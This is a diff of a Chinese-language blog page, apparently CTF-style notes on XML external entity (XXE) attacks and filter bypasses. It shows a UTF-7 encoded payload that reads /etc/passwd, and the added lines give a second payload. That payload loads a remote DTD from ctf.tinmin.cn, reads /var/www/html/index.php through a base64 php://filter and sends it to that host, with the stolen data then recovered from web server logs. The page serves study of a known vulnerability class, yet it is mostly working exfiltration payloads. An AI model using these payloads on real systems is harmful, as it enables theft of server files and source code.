@@ -199,7 +199,7 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-7"?&gt;</span> </span><br><span class="line">+ADwAIQ-DOCTYPE data +AFs</span><br><span class="line">+ADwAIQ-ELEMENT data (+ACM-PCDATA)+AD4</span><br><span class="line">+ADwAIQ-ENTITY file SYSTEM +ACI-file:///etc/passwd+ACIAPg-</span><br><span class="line">+AF0APg</span><br><span class="line">+ADw-data+AD4AJg-file+ADsAPA-/data+AD4</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/xml/xml2.png" alt="img"></p>
-<h3 id="引用外部的DTD"><a href="#引用外部的DTD" class="headerlink" title="引用外部的DTD"></a>引用外部的DTD</h3><p>在自己的vps放dtd</p>
+<h3 id="引用外部的DTD"><a href="#引用外部的DTD" class="headerlink" title="引用外部的DTD()"></a>引用外部的DTD()</h3><p>在自己的vps放dtd</p>
 <p><code>xml.dtd</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://vps/?%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure>
 
@@ -213,6 +213,16 @@
 <p>可以不读php文件，<code>/etc/passwd</code>文件就不行，太大了</p>
 <p><img src="https://i.loli.net/2019/11/06/oM1QGtHnTElWudB.png" alt="img"></p>
 <p>也可以直接读php</p>
+<p><code>payload2</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE roottag [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://ctf.tinmin.cn/exp.dtd"&gt; </span></span><br><span class="line"><span class="meta">%dtd;%int;%send; ]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>exp.dtd</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://ctf.tinmin.cn/?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用burp测试发现，得在http头下隔一行，不然不成功，没懂什么原因,</p>
+<p><img src="https://i.loli.net/2019/11/06/XRoYfIkcUpOT1CW.png" alt="img"></p>
+<p>通过查看nginx 或者apache 日志</p>
+<p><img src="https://i.loli.net/2019/11/06/RkuCsn87Ly9hJKl.png" alt="image.png"></p>
 
   </article>
   <aside class="table-content" id="site-toc">
@@ -221,7 +231,7 @@
     <span>目录</span>
   </div>
   <div class="table-content-main">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编码"><span class="toc-text">编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#引用外部的DTD"><span class="toc-text">引用外部的DTD</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编码"><span class="toc-text">编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#引用外部的DTD"><span class="toc-text">引用外部的DTD()</span></a></li></ol></li></ol>
   </div>
 </aside>
   
